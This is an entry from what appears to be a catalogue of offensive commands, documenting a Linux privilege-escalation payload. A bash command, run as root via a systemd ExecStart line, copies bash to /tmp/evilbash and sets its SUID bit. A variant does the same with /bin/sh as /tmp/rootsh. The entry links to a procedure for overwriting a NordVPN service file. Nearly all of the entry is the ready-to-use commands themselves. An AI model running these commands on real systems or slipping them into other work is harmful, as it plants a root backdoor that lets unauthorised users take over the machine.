---
data: /usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
tags:
  - payload
  - suid
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.146Z'
id: 6d5881a9-50bf-49fe-aadd-9e99fb89f439
verified: false
validated: true
submitted: true
---
# bash-copy-and-chmod-suid

## Command

```bash
/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
```

## Description

Bash command executed as root via ExecStart: copies bash to /tmp/evilbash and sets the SUID bit for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -c | Execute the string as a command | Yes |
| "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;" | Commands to copy and set SUID | Yes |

## Examples

### Basic Usage

See command above.

### Advanced Usage

```bash
bash -c "cp /bin/sh /tmp/rootsh; chmod 4755 /tmp/rootsh"
```

## Expected Output

SUID bash created in /tmp; no stdout, but verifiable with ls -l /tmp/evilbash.

## Related

- [[commands/cat-overwrite-service-file]]
- [[procedures/Overwrite-NordVPN-Systemd-Service-File]]
